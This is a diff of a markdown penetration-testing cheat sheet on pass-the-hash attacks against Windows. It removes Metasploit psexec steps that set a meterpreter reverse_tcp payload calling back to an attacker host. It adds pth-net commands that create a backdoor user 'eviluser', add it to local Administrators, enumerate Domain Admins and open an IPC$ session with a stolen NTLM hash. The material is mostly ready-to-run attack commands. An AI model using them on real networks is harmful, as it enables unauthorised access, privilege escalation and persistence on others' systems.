@@ -61,33 +61,32 @@ psexec.py <domain>/<username>@<target_ip> -hashes <LM_Hash>:<NT_Hash>
 - `-hashes` allows direct use of NTLM hashes.
 
 - If the account is a local or domain admin, this spawns a remote SYSTEM shell.
+- 
 
-#### Using Metasploit
+---
 
-1. **Search for a Suitable Module**: Use the `psexec` module, which supports NTLM hashes:
+## Pth-net 
 
+`pth-net` is a modified version of the Windows `net.exe` command that supports hash-based authentication, allowing attackers to interact with remote systems without knowing the plaintext password.
+
+**Common Usage:**
+
+- Creates a new local user named `eviluser` with the password `Passw0rd!`.
 ```bash
-search psexec
-use exploit/windows/smb/psexec
+pth-net user add <username> <password> /add
 ```
 
-2. **Configure the Module**: Set the target information and hash:
-
+- Adds the newly created user to the local Administrators group.
 ```bash
-set RHOSTS <target_ip>
-set SMBUser <username>
-set SMBPass <NTLM_hash>
-set SMBDomain .
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <attacker_ip>
-set LPORT <attacker_port>
+pth-net localgroup administrators eviluser /add
 ```
 
-3. **Execute the Exploit**: Run the exploit to establish a session:
-
+- Lists members of the Domain Admins group in a domain environment.
 ```bash
-exploit
-# After a successful session, use `meterpreter` commands to gather information or escalate privileges:
-meterpreter > sysinfo
-meterpreter > getuid
+pth-net group "Domain Admins" /domain
+```
+
+- Establishes a connection to the IPC$ share using NTLM hash authentication.
+```bash
+pth-net use \\target\IPC$ /user:<domain>\<username> <NTLM_hash>
 ```
